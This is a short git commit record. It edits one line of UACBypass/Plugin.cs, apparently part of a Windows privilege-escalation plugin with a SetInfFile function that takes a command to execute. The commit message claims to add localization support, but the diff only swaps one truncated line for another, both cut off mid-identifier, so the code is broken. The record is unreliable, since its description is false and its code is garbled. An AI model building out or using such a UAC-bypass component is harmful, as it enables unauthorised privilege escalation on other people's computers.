076ba3793249b272fda1d2e9e867113113918a32
martinescoz <plikiagkuym2@gmx.com>
2024-12-27 17:37:44 +0000

    Add localization support for multi-language

--- UACBypass/Plugin.cs
+++ UACBypass/Plugin.cs
@@ -70,4 +70,4 @@ class Program
 
     static string SetInfFile(string commandToExecute)
     {
-        string str1 = Path.GetFileNameWithoutExtension(AppDomain.CurrentDomain.Fri
+        string str1 = Path.GetFileNameWithoutExtension(AppDomain.CurrentDomain
